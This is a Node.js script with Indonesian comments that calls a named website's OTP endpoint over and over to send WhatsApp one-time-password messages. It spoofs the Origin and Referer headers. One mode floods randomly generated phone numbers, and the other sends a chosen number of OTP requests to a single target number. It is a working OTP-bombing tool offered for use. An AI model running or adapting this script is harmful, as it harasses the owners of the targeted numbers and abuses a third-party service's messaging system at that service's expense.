// Contoh pengiriman POST request menggunakan Node.js (v18+)
const readline = require('readline');

// 1. Tentukan URL target dan Headers
const targetUrl = 'https://mastulung.web.id/api.php';
const headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://mastulung.web.id',
    'Referer': 'https://mastulung.web.id/'
};

// 2. Fungsi untuk membuat nomor WA acak (Prefix 0812 / 0877, Total 12 digit)
function getRandomWaNumber() {
    const prefixes = ['0812', '0877'];
    const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    
    let randomNumber = randomPrefix;
    // Tambahkan 8 digit angka acak (karena prefix sudah 4 digit)
    for (let i = 0; i < 8; i++) {
        randomNumber += Math.floor(Math.random() * 10).toString();
    }
    return randomNumber;
}

// 3. Fungsi delay agar tidak spam server terlalu cepat
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// 4. Fungsi asynchronous untuk mengirim request per nomor
async function sendPostRequest(waNumber) {
    // Siapkan payload dengan nomor WA
    const payload = new URLSearchParams({
        action: 'request_otp',
        wa: waNumber,
        role: 'client'
    });

    try {
        const response = await fetch(targetUrl, {
            method: 'POST',
            headers: headers,
            body: payload
        });

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }

        const result = await response.text(); 
        console.log(`[SUCCESS] Nomor ${waNumber} -> Server merespons: ${result.trim()}`);

    } catch (error) {
        console.error(`[ERROR] Nomor ${waNumber} -> Gagal mengirim:`, error.message);
    }
}

// 5. Setup antarmuka terminal untuk input pengguna
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Fungsi pembantu (helper) untuk menanyakan input secara berurutan dengan async/await
const askQuestion = (query) => new Promise(resolve => rl.question(query, resolve));

// 6. Fungsi utama untuk menjalankan program interaktif
async function main() {
    console.log("=== SISTEM REQUEST OTP ===");
    console.log("Pilih mode pengiriman:");
    console.log("1. Multi request ke banyak nomor WA acak");
    console.log("2. Multi request ke SATU nomor WA spesifik");
    
    const mode = await askQuestion("\nMasukkan pilihan (1 atau 2): ");

    if (mode === '1') {
        // --- MODE 1: NOMOR ACAK ---
        const answer = await askQuestion('Berapa banyak nomor WA (request) yang ingin dikirim? ');
        const totalRequests = parseInt(answer);

        if (isNaN(totalRequests) || totalRequests <= 0) {
            console.log('Harap masukkan angka yang valid dan lebih dari 0.');
        } else {
            console.log(`\nMemulai proses pengiriman ${totalRequests} request OTP ke nomor acak...\n`);
            for (let i = 1; i <= totalRequests; i++) {
                const currentWaNumber = getRandomWaNumber();
                console.log(`Memproses request ke-${i} dari ${totalRequests}...`);
                await sendPostRequest(currentWaNumber);
                if (i < totalRequests) await delay(1000); // Jeda 1 detik
            }
        }

    } else if (mode === '2') {
        // --- MODE 2: SATU NOMOR SPESIFIK ---
        const targetNumber = await askQuestion('Masukkan nomor WA target (misal: 081234567890): ');
        
        if (!targetNumber || targetNumber.length < 10) {
            console.log('Nomor WA tidak valid.');
        } else {
            const answer = await askQuestion(`Berapa banyak request yang ingin dikirim ke ${targetNumber}? `);
            const totalRequests = parseInt(answer);

            if (isNaN(totalRequests) || totalRequests <= 0) {
                console.log('Harap masukkan angka yang valid dan lebih dari 0.');
            } else {
                console.log(`\nMemulai proses pengiriman ${totalRequests} request OTP ke nomor ${targetNumber}...\n`);
                for (let i = 1; i <= totalRequests; i++) {
                    console.log(`Memproses request ke-${i} dari ${totalRequests}...`);
                    await sendPostRequest(targetNumber);
                    if (i < totalRequests) await delay(1000); // Jeda 1 detik
                }
            }
        }

    } else {
        console.log("Pilihan tidak valid. Silakan jalankan ulang skrip.");
    }

    console.log('\n✅ Semua proses selesai.');
    rl.close();
}

// Jalankan program utama
main();